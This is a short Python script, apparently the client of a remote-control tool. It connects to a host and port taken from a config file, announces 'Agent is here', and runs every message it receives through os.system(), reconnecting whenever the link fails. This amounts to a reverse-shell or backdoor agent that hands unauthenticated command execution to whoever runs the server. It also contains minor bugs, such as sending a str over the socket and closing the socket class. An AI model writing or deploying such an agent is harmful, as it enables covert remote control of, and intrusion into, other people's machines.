#!/usr/bin/env python

import os
import sys
import time
from socket import socket, AF_INET, SOCK_STREAM
sys.path.insert(0, '..')
sys.dont_write_bytecode = True
try:
    from lib.log import get_logger
    from lib.config import get_config
except:
    raise

LOG = get_logger()
HOST = get_config('../cfg/client.toml')['client']['interface']
PORT = get_config('../cfg/client.toml')['client']['port']


def connect_agent():
    sock = socket(AF_INET, SOCK_STREAM)
    addr = (HOST, PORT)
    LOG.info('Connecting to {} port {}.'.format(str(HOST), str(PORT)))
    try:
        sock.connect(addr)
        while True:
            sock.send('Agent is here')
            data = sock.recv(1024)
            if not data:
                continue
            LOG.info('Received {}'.format(data))
            os.system(data)
    except:
        LOG.error('Server doesn\'t response')
        time.sleep(1)
        connect_agent()

if __name__ == '__main__':
    try:
        connect_agent()
    except KeyboardInterrupt:
        sys.exit()
        LOG.info('Exit')
    finally:
        socket.close()
